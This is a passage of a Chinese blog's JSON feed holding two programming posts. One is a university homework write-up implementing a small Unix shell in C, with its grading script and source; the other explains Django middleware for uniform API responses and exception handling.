class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">pid_t</span> <span class=\"title function_\">wait</span><span class=\"params\">(<span class=\"type\">int</span>* status)</span>;</span><br><span class=\"line\"><span class=\"type\">pid_t</span> <span class=\"title function_\">waitpid</span><span class=\"params\">(<span class=\"type\">pid_t</span> pid, <span class=\"type\">int</span>* status, <span class=\"type\">int</span> options)</span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>WNOHANG 如果该子进程没有结束，则以非阻塞方式等待子进程，并且返回0;如果该子进程已经结束，返回其pid.如果没有子进程退出，则立刻返回-1</li>\n<li>WUNTRACED  若子进程进入暂停状态，则马上返回</li>\n</ul>\n<h2 id=\"WIFEXTED与WEXITSTATUS\"><a href=\"#WIFEXTED与WEXITSTATUS\" class=\"headerlink\" title=\"WIFEXTED与WEXITSTATUS\"></a>WIFEXTED与WEXITSTATUS</h2><ul>\n<li>WIFEXTED(status) 这个宏用来获取是否正常退出，正常退出获得true</li>\n<li>WEXITSTATUS(status) 只可在WIFEXITED为true时使用，获取正常退出的状态码</li>\n</ul>\n<h2 id=\"WIFSIGNALED与WTERMSIG\"><a href=\"#WIFSIGNALED与WTERMSIG\" class=\"headerlink\" title=\"WIFSIGNALED与WTERMSIG\"></a>WIFSIGNALED与WTERMSIG</h2><ul>\n<li>WIFSIGNALED(status) 这个宏用来获取是否异常退出，异常退出获得true</li>\n<li>WTERMSIG(status) 只可在WIFSIGNALED为true时使用，获取异常退出的状态码<figure class=\"highlight c\"><figcaption><span>smallsh.c</span><a href=\"/downloads/code/smallsh.c\">view raw</a></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">waitpid(pid, &amp;status, WUNTRACED);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (WIFEXITED(status))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (WEXITSTATUS(status));</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (WIFSIGNALED(status))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (WTERMSIG(status));</span><br></pre></td></tr></table></figure></li>\n</ul>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"简介俄勒冈州立大学（Oregon State University) CS 344作业,使用C语言实现一个Shell. 要求 内置 cd,status和exit 命令 支持输入和输出的重定向 支持后台运行(&amp;) Ctrl-Z 与 Ctrl-C 调用系统其他命令 替换命令中的$$为Shell的PID 参考资料作业pdf 测试脚本p3testscriptview raw123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#!/bin/bashecho &quot;PRE-SCRIPT INFO&quot;echo &quot; Grading Script PID: $$&quot;echo &#x27; Note: your smallsh will report a different PID when evaluating $$&#x27;./smallsh &lt;&lt;&#x27;___EOF___&#x27;echo BEGINNING TEST SCRIPTechoecho --------------------echo Using comment (5 points if only next prompt is displayed next)#THIS COMMENT SHOULD DO NOTHINGechoechoecho --------------------echo ls (10 points for returning dir contents)lsechoechoecho --------------------echo ls out junkls &gt; junkechoechoecho --------------------echo cat junk (15 points for correctly returning contents of junk)cat junkechoechoecho --------------------echo wc in junk (15 points for returning correct numbers from wc)wc &lt; junkechoechoecho --------------------echo wc in junk out junk2; cat junk2 (10 points for returning correct numbers from wc)wc &lt; junk &gt; junk2cat junk2echoechoecho --------------------echo test -f badfile (10 points for returning error value of 1, note extraneous &amp;)test -f badfilestatus &amp;echoechoecho --------------------echo wc in badfile (10 points for returning text error)wc &lt; badfileechoechoecho --------------------echo badfile (10 points for returning text error)badfileechoechoecho --------------------echo sleep 100 background (10 points for returning process ID of sleeper)sleep 100 &amp;echoechoecho --------------------echo pkill -signal SIGTERM sleep (10 points for pid of killed process, 10 points for signal)echo (Ignore message about Operation Not Permitted)pkill sleepechoechoecho --------------------echo sleep 1 background (10 pts for pid of bg ps when done, 10 for exit value)sleep 1 &amp;sleep 1echoechoecho --------------------echo pwdpwdechoechoecho --------------------echo cdcdechoechoecho --------------------echo pwd (10 points for being in the HOME dir)pwdechoechoecho --------------------echo mkdir testdir$$mkdir testdir$$echoechoecho --------------------echo cd testdir$$cd testdir$$echoechoecho --------------------echo pwd (5 points for being in the newly created dir)pwdecho --------------------echo Testing foreground-only mode (20 points for entry &amp; exit text AND ~5 seconds between times)kill -SIGTSTP $$datesleep 5 &amp;datekill -SIGTSTP $$exit___EOF___ 源码smallsh.cview raw123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/wait.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#define MAX_INPUT_LENGTH 2048#define MAX_ARG_NUMBER 512#define SPLIT_CHAR &quot; \\t\\r\\n&quot;int allowBg = 1;char *readLine(){ size_t maxLength = MAX_INPUT_LENGTH; char *line = (char *)malloc(sizeof(char) * maxLength); fgets(line, maxLength, stdin); int i = 0; for (i = 0; i &lt; maxLength; i++) { if (line[i] == &#x27;\\n&#x27;) { line[i] = &#x27;\\0&#x27;; } } return line;}char **parse(char *line, int *num, int *back){ size_t maxNumber = MAX_ARG_NUMBER; int i = 0; char **arr = (char **)malloc(sizeof(char *) * maxNumber); char *token; token = strtok(line, SPLIT_CHAR); while (token != NULL) { arr[i] = token; // replace $$ int j = 0; for (j = 0; j &lt; strlen(arr[i])-1; j++) { if (arr[i][j] == &#x27;$&#x27; &amp;&amp; arr[i][j + 1] == &#x27;$&#x27;) { arr[i][j] = &#x27;\\0&#x27;; arr[i][j+1] = &#x27;\\0&#x27;; char t[10]; char newArg[50]; memset(t, &#x27;\\0&#x27;, 10); memset(newArg, &#x27;\\0&#x27;, 50); strncpy(newArg, arr[i], j); sprintf(t, &quot;%d&quot;, getpid()); strcat(newArg, t); // sprintf(arr[i], newArg); arr[i] = newArg; } } i++; token = strtok(NULL, SPLIT_CHAR); } if (i &gt;= 2 &amp;&amp; strcmp(arr[i - 1], &quot;&amp;&quot;) == 0) { arr[i - 1] = NULL; i--; if(allowBg == 1){ *back = 1; } } *num = i; arr[i] = NULL; return arr;}void printStatus(int status){ if (status == 0 || status == 1) printf(&quot;exit value %d\\n&quot;, status); else printf(&quot;terminated by signal %d\\n&quot;, status);}void catchSIGTSTP(int sig){ if (allowBg == 1) { char *message = &quot;Entering foreground-only mode(&amp; is now ignored)\\n&quot;; write(STDOUT_FILENO, message, 49); fflush(stdout); allowBg = 0; } else { char *message = &quot;Exiting foreground-only mode\\n&quot;; write(STDOUT_FILENO, message, 30); fflush(stdout); allowBg = 1; }}void catchSIGINT(int signo){ char message[] = &quot;terminated by signal &quot;; char t[10]; memset(t, &#x27;\\0&#x27;, 10); sprintf(t, &quot;%d&quot;, signo); strcat(message, t); strcat(message, &quot;\\n&quot;); printf(&quot;%s&quot;, message); fflush(stdout); fflush(stdin);}int newProcess(char **arr, int num, int back){ pid_t pid = fork(); int status, fd; int input_flag = -1; int output_flag = -1; int i = 0; for (i = 0; i &lt; num; i++) { if (strcmp(arr[i], &quot;&lt;&quot;) == 0) input_flag = i; else if (strcmp(arr[i], &quot;&gt;&quot;) == 0) output_flag = i; } if (pid == 0) { struct sigaction sigint = {0}; sigint.sa_handler = catchSIGINT; sigemptyset(&amp;sigint.sa_mask); sigint.sa_flags = 0; sigaction(SIGINT, &amp;sigint, NULL); // input redirect if (input_flag &gt; -1) { fd = open(arr[input_flag + 1], O_RDONLY, 0644); if (fd == -1) { printf(&quot;cannot open %s for input\\n&quot;, arr[input_flag + 1]); exit(1); } else { if (dup2(fd, 0) == -1) { printf(&quot;: Could not redirect stdin for input file %s\\n&quot;, arr[input_flag + 1]); exit(1); } arr[input_flag] = NULL; close(fd); } } //output redirect if (output_flag &gt; -1) { fd = open(arr[output_flag + 1], O_WRONLY | O_CREAT | O_TRUNC, 0644); if (fd == -1) { printf(&quot;cannot not open %s for output\\n&quot;, arr[output_flag + 1]); exit(1); } else { if (dup2(fd, 1) == -1) { printf(&quot;Could not redirect stdout for output file %s\\n&quot;, arr[output_flag + 1]); exit(1); } arr[output_flag] = NULL; close(fd); } } if (back == 1 &amp;&amp; input_flag &lt; 0) { fd = open(&quot;/dev/null&quot;, O_RDONLY, 0644); if (fd == -1) { printf(&quot;Could not open \\&quot;/dev/null\\&quot;\\n&quot;); exit(1); } else { if (dup2(fd, 0) == -1) { printf(&quot;Could not redirect stdin to \\&quot;/dev/null\\&quot;\\n&quot;); exit(1); } close(fd); } } // printf(&quot;%c\\n&quot;, arr[0][0]); if (execvp(arr[0], arr) == -1 &amp;&amp; arr[0][0] &gt;= &#x27;a&#x27; &amp;&amp; arr[0][0] &lt;= &#x27;z&#x27;) { printf(&quot;%s: no such file or directory\\n&quot;, arr[0]); fflush(stdout); exit(1); } } else if (pid &lt; 0) { printf(&quot;Smallsh !\\n&quot;); return 1; } else { // parent if (back == 1) { printf(&quot;Background pid is %d.\\n&quot;, pid); fflush(stdout); } else { waitpid(pid, &amp;status, WUNTRACED); if (WIFEXITED(status)) return (WEXITSTATUS(status)); else if (WIFSIGNALED(status)) return (WTERMSIG(status)); } } return status;}int executeCommand(char **arr, int status, int num, int back){ if (arr[0] == NULL || strcmp(&quot;#&quot;, arr[0]) == 0) return status; else if (strcmp(arr[0], &quot;exit&quot;) == 0) exit(0); else if (strcmp(arr[0], &quot;status&quot;) == 0) printStatus(status); else if (strcmp(arr[0], &quot;cd&quot;) == 0) { char *directory; if (arr[1] == NULL) directory = getenv(&quot;HOME&quot;); else directory = arr[1]; if (chdir(directory) == -1) { printf(&quot;cd: No such file or directory\\n&quot;); fflush(stdout); } return status; } else { int t = newProcess(arr, num, back); // printf(&quot;------------%d---\\n&quot;,t); // fflush(stdout); return t; }}int main(){ char *input; char **arr; int status = 0; struct sigaction sigint = {0}; sigint.sa_handler = SIG_IGN; sigemptyset(&amp;sigint.sa_mask); sigint.sa_flags = 0; sigaction(SIGINT, &amp;sigint, NULL); struct sigaction sigtstp = {0}; sigtstp.sa_handler = catchSIGTSTP; sigfillset(&amp;sigtstp.sa_mask); sigtstp.sa_flags = 0; sigaction(SIGTSTP, &amp;sigtstp, NULL); while (1) { int num = 0; int back = 0; printf(&quot;: &quot;); fflush(stdout); input = readLine(); arr = parse(input, &amp;num, &amp;back); status = executeCommand(arr, status, num, back); //background pid_t childPid = waitpid(-1, &amp;status, WNOHANG); if (childPid &gt; 0) { printf(&quot;background pid %d is done: &quot;, childPid); if (WIFEXITED(status)) printf(&quot;exit value %d\\n&quot;, WEXITSTATUS(status)); else printf(&quot;terminated by signal %d\\n&quot;, status); fflush(stdout); } fflush(stdin); free(input); free(arr); } return 0;} 总结wait()函数12pid_t wait(int* status);pid_t waitpid(pid_t pid, int* status, int options); WNOHANG 如果该子进程没有结束，则以非阻塞方式等待子进程，并且返回0;如果该子进程已经结束，返回其pid.如果没有子进程退出，则立刻返回-1 WUNTRACED 若子进程进入暂停状态，则马上返回 WIFEXTED与WEXITSTATUS WIFEXTED(status) 这个宏用来获取是否正常退出，正常退出获得true WEXITSTATUS(status) 只可在WIFEXITED为true时使用，获取正常退出的状态码 WIFSIGNALED与WTERMSIG WIFSIGNALED(status) 这个宏用来获取是否异常退出，异常退出获得true WTERMSIG(status) 只可在WIFSIGNALED为true时使用，获取异常退出的状态码smallsh.cview raw12345waitpid(pid, &amp;status, WUNTRACED); if (WIFEXITED(status)) return (WEXITSTATUS(status)); else if (WIFSIGNALED(status)) return (WTERMSIG(status));","summary":"简介俄勒冈州立大学（Oregon State University) CS 344作业,使用C语言实现一个Shell.","date_published":"2020-02-25T12:23:00.000Z","tags":["Shell","C语言","Linux"]},{"id":"https://zhaoqi.vip/posts/2620614917/","url":"https://zhaoqi.vip/posts/2620614917/","title":"在Django中间件处对API进行统一处理","content_html":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>公司实习时遇到一个问题:项目中所使用不是Restful API,每个视图函数都要先生成字典，于是项目中便充斥着如下的代码:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result=&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;msg&quot;</span>:<span class=\"string\">&#x27;xx&quot;,</span></span><br><span class=\"line\"><span class=\"string\">\t&quot;status&quot;:200,</span></span><br><span class=\"line\"><span class=\"string\">\t&quot;result&quot;:data</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">return HttpResponse(json.loads(result))</span></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n\n<p>维护起来比较麻烦，对前端也很不友好，为了解决该问题，自定义了一个Django中间件对API格式和异常进行统一处理，以此达到如下效果:</p>\n<ul>\n<li>在view中只需返回<code>data</code>，<code>raise</code>自定义的异常</li>\n<li>实现自定义异常状态码(<code>status</code>)和自定义异常信息(<code>message</code>)</li>\n<li>view中返回的<code>Object</code>若为<code>Model</code>,则会返回调用其<code>__str__</code>方法的结果</li>\n<li>对于<code>view</code>中出现的其他异常，<code>Response</code>会返回<code>Unknown exception</code></li>\n<li>异常信息(<code>message</code>)实现了<code>i18n</code></li>\n</ul>\n<h1 id=\"Django中对异常的处理\"><a href=\"#Django中对异常的处理\" class=\"headerlink\" title=\"Django中对异常的处理\"></a>Django中对异常的处理</h1><h2 id=\"Django中对request的处理\"><a href=\"#Django中对request的处理\" class=\"headerlink\" title=\"Django中对request的处理\"></a>Django中对request的处理</h2><ul>\n<li>首先执行<code>process_request</code>函数，然后在执行视图函数之前执行<code>process_view</code>函数，再执行视图函数，最后执行<code>process_response</code>函数</li>\n<li><code>process_request</code>只返回<code>None</code>，所有中间件的<code>process_request</code>执行完之后，就匹配路由，找到对应的视图函数，在执行视图函数之前先执行中间件的 <code>process_view</code>函数</li>\n<li>如果<code>process_view</code>返回 None，就继续执行后续的中间件的<code>process_view</code>方法，执行完所有的<code>process_view</code>函数之后执行视图函数</li>\n<li>如果其中有个 process_view 返回了 HttpResponse，就不执行后续的 process_view 函数，会跳到第一个 process_response 函数，并继续往下执行</li>\n</ul>\n<p><img data-src=\"/../images/pasted-0.png\" alt=\"Diango中中间件处理过程\"></p>\n<h2 id=\"中间件-类-中5种方法\"><a href=\"#中间件-类-中5种方法\" class=\"headerlink\" title=\"中间件(类)中5种方法\"></a>中间件(类)中5种方法</h2><p>中间件中可以定义5个方法:</p>\n<ul>\n<li>process_request(request)</li>\n<li>process_view(request, view_func, view_args, view_kwargs)</li>\n<li>process_exception(request, exception)</li>\n<li>process_template_response(request, response)</li>\n<li>process_response(request, response)</li>\n</ul>\n<h3 id=\"process-request\"><a href=\"#process-request\" class=\"headerlink\" title=\"process_request\"></a>process_request</h3><ol>\n<li>中间件在收到<code>request</code>请求之后执行</li>\n<li>按照<code>settings.py</code>中<code>MIDDLEWARE_CLASSES</code>的顺序，顺序执行</li>\n<li>如果该函数返回<code>None</code>，继续执行后面的中间件的<code>process_request</code>方法</li>\n<li>如果该函数返回<code>HttpResponse</code>，则不再继续执行后面的中间件的<code>process_request </code>方法</li>\n</ol>\n<h3 id=\"process-view\"><a href=\"#process-view\" class=\"headerlink\" title=\"process_view\"></a>process_view</h3><ol>\n<li>执行完所有中间件的<code>process_request</code>方法</li>\n<li>在<code>urls.py</code>中找到对应视图函数</li>\n<li>拿到视图函数的名称、参数，在执行视图函数之前执行</li>\n<li>如果返回<code>None</code>，则继续执行后面的中间件的<code>process_view</code>函数，然后执行下昂应的视图函数</li>\n<li>如果返回<code>HttpResponse</code>，则不执行后续的<code>process_view</code>函数，也不执行视图函数，然后执行所有的<code>response</code>中间件</li>\n</ol>\n<h3 id=\"process-exception\"><a href=\"#process-exception\" class=\"headerlink\" title=\"process_exception\"></a>process_exception</h3><ol>\n<li>执行视图函数的过程中如果引发异常，则按照<code>settings.py</code>中<code>MIDDLEWARE_CLASSES</code>的顺序，倒序执行<code>process_exception</code>方法</li>\n<li>如果返回<code>None</code>，继续执行下一个中间件的<code>process_exception</code>方法 </li>\n<li>如果返回<code>HttpReponse</code>对象，则该中间件上方其他中间件的<code>process_exception</code>方法不会被调用</li>\n<li>一旦其中某个中间件有返回值，则调用<code>template_response</code>和<code>response</code>中间件<br>,否则启动<a href=\"https://docs.djangoproject.com/zh-hans/2.1/ref/views/#error-views\">默认的异常处理</a></li>\n</ol>\n<div class=\"note info\">\n            <p>最后半句个人理解:如果如果所有中间件的<code>process_exception</code>方法都执完后还没有返回值，则启动默认的异常处理</p>\n          </div>\n\n<h3 id=\"process-template-response\"><a href=\"#process-template-response\" class=\"headerlink\" title=\"process_template_response\"></a>process_template_response</h3><ol>\n<li>在视图函数执行结束之后执行</li>\n<li><code>response</code>是Django视图或者某一中间件的返回值(<code>TemplateResponse</code>对象或等价)</li>\n<li>只有<code>response</code>实现了<code>render</code>方法才会执行</li>\n<li>一旦所有的中间件的<code>template_response</code>被执行完，则调用<code>render</code>方法</li>\n<li>按照中间件的顺序，倒序执行</li>\n</ol>\n<h3 id=\"process-response\"><a href=\"#process-response\" class=\"headerlink\" title=\"process_response\"></a>process_response</h3><ol>\n<li>在视图函数执行结束之后执行</li>\n<li>必须有返回值，且返回类型必须是<code>HttpResponse</code>对象</li>\n<li>按照中间件的顺序，倒序执行</li>\n</ol>\n<h1 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h1><h2 id=\"文件\"><a href=\"#文件\" class=\"headerlink\" title=\"文件\"></a>文件</h2><ul>\n<li>middleware.py<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.utils.deprecation <span class=\"keyword\">import</span> MiddlewareMixin</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.models <span class=\"keyword\">import</span> models</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.core.serializers.json <span class=\"keyword\">import</span> DjangoJSONEncoder</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.http <span class=\"keyword\">import</span> JsonResponse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyMiddleware</span>(<span class=\"title class_ inherited__\">MiddlewareMixin</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">process_exception</span>(<span class=\"params\">self, request, exception</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(exception, BaseException):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> settings.DEBUG:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> JsonResponse(&#123;<span class=\"string\">&#x27;result&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"built_in\">str</span>(exception), <span class=\"string\">&#x27;status&#x27;</span>: <span class=\"number\">1000</span>&#125;)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> JsonResponse(UnknownException().as_dict())</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> JsonResponse(exception.as_dict())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">process_response</span>(<span class=\"params\">self, request, response</span>):</span><br><span class=\"line\">        procese_type = (<span class=\"built_in\">list</span>, <span class=\"built_in\">tuple</span>, <span class=\"built_in\">dict</span>, <span class=\"built_in\">str</span>, <span class=\"built_in\">int</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(response, models.Model):</span><br><span class=\"line\">            response = <span class=\"built_in\">str</span>(response)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(response, procese_type):</span><br><span class=\"line\">            ret = &#123;<span class=\"string\">&#x27;result&#x27;</span>: response, <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;success&#x27;</span>, <span class=\"string\">&#x27;status&#x27;</span>: <span class=\"number\">200</span>&#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> JsonResponse(ret, encoder=DjangoJSONEncoder)</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> response</span><br></pre></td></tr></table></figure></li>\n<li>exceptions.py<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> abc <span class=\"keyword\">import</span> ABCMeta</span><br><span class=\"line\"><span class=\"keyword\">from</span> .message <span class=\"keyword\">import</span> ErrorMsg</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">InterFaceAsDictInterFace</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">as_dict</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        ret = &#123;<span class=\"string\">&#x27;result&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"built_in\">getattr</span>(self, <span class=\"string\">&#x27;__msg__&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>), <span class=\"string\">&#x27;status&#x27;</span>: <span class=\"built_in\">getattr</span>(self, <span class=\"string\">&#x27;__status__&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)&#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">BaseException</span>(Exception, InterFaceAsDictInterFace):</span><br><span class=\"line\">    __metaclass__ = ABCMeta</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, msg=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(BaseException, self).__init__()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> msg <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            self.__msg__ = msg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UnknownException</span>(<span class=\"title class_ inherited__\">InterFaceAsDictInterFace</span>):</span><br><span class=\"line\">\t__status__ = <span class=\"number\">1000</span></span><br><span class=\"line\">\t__msg__ = ErrorMsg.UNKNOWN_EXCEPTION</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyException</span>(<span class=\"title class_ inherited__\">BaseException</span>):</span><br><span class=\"line\">\t__status__=<span class=\"number\">1001</span></span><br><span class=\"line\">\t__msg__=ErrorMsg.MY_EXCEPTION</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n<li>message.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.utils.translation <span class=\"keyword\">import</span> gettext <span class=\"keyword\">as</span> _</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ErrorMsg</span>:</span><br><span class=\"line\">\tUNKNOWN_EXCEPTION= _(<span class=\"string\">&#x27;Unknown exception.&#x27;</span>)</span><br><span class=\"line\">\tMY_EXCEPTION = _(<span class=\"string\">&#x27;Test exception.&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"修改settings文件\"><a href=\"#修改settings文件\" class=\"headerlink\" title=\"修改settings文件\"></a>修改settings文件</h2><p>修改<code>setting</code>中的<code>MIDDLEWARE_CLASSES</code>变量</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MIDDLEWARE = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.middleware.security.SecurityMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;middleware.MyMiddleware&#x27;</span>,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Todo\"><a href=\"#Todo\" class=\"headerlink\" title=\"Todo\"></a>Todo</h1><h2 id=\"对前端Post请求进行参数校验\"><a href=\"#对前端Post请求进行参数校验\" class=\"headerlink\" title=\"对前端Post请求进行参数校验\"></a>对前端Post请求进行参数校验</h2><p>目前想出来了两种策略(假设<code>post_json</code>为序列化后的字典):</p>\n<ol>\n<li>视图函数中使用<code>get</code>从字典中获取参数，判断<code>required</code>的参数是否为空，<code>raise</code>自定义的异常，如:<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># exception.py</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ValidationError</span>(<span class=\"title class_ inherited__\">BaseException</span>):</span><br><span class=\"line\">\t__msg__ = ErrorMsg.INVALID_ARGUMENT</span><br><span class=\"line\">\t__status__ = <span class=\"number\">1001</span></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># message.py</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ErrorMsg</span>:</span><br><span class=\"line\">\tUNKNOWN_EXCEPTION= _(<span class=\"string\">&#x27;Unknown exception.&#x27;</span>)</span><br><span class=\"line\">\tINVALID_ARGUMENT = _(<span 